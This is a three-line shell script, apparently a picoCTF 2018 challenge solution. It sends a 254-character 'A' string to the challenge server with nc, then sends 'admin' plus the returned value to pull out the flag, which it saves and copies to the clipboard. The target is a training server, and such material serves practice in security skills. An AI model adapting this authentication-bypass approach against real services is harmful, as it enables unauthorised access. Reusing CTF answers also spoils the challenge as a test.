VAL=$(python3 -c "print('A'*254)" | timeout 1 nc 2018shell.picoctf.com 23685 | tail -2 | head -1)
echo -e  "admin\n$VAL" |  timeout 5 nc 2018shell.picoctf.com 23685 | grep picoCTF{.*} > solution.txt
cat solution.txt | xclip -sel clipboard
